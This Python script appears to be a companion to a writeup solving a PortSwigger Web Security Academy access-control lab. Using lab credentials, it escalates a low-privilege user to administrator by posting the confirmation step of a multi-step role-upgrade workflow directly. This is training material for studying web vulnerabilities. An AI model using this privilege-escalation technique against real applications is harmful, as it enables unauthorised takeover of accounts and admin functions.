#!/usr/bin/env python3
"""
Multi-step process with no access control on one step
PortSwigger Web Security Academy -- Access Control

Companion script for the writeup: 12-multi-step-process-no-access-control.md

What this does:
    Logs in as administrator first to see the two-step promotion workflow
    (/admin-roles, then a confirmation submission carrying confirmed=true).
    Then logs in as wiener and sends only the confirmation step -- action=
    upgrade&confirmed=true&username=wiener -- with no prior "initial" request
    ever made. The confirmation step has no access control of its own; it
    just assumes step one already happened.

Usage:
    python 12-multi-step-process-no-access-control.py <lab-url>

Requirements:
    pip install httpx
"""

import re
import sys
import httpx


def get_csrf(html: str) -> str:
    m = re.search(r'name="csrf"\s+value="([^"]+)"', html)
    return m.group(1) if m else ""


def login(client: httpx.Client, base: str, username: str, password: str) -> httpx.Response:
    login_page = client.get(f"{base}/login")
    csrf = get_csrf(login_page.text)
    return client.post(f"{base}/login", data={"csrf": csrf, "username": username, "password": password})


def solve(lab_url: str) -> None:
    # Log in as administrator first to see the real multi-step workflow end to end.
    admin_client = httpx.Client(follow_redirects=True, timeout=15)
    login(admin_client, lab_url, "administrator", "admin")
    resp = admin_client.get(f"{lab_url}/admin")
    print(f"[*] Admin panel: {resp.status_code}")

    # Log in as wiener and skip straight to the confirmation step.
    client = httpx.Client(follow_redirects=True, timeout=15)
    login(client, lab_url, "wiener", "peter")

    resp = client.post(f"{lab_url}/admin-roles", data={
        "action": "upgrade", "confirmed": "true", "username": "wiener",
    })
    print(f"[*] Direct POST /admin-roles (confirmed=true, no prior step): {resp.status_code}")

    check = client.get(lab_url)
    if "Congratulations" in check.text:
        print("[+] Lab solved -- wiener promoted by hitting the confirmation step directly.")
    else:
        print("[-] Not solved yet -- confirm the confirmation step's parameter names.")


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: python {sys.argv[0]} <lab-url>")
        sys.exit(1)
    solve(sys.argv[1].rstrip("/"))
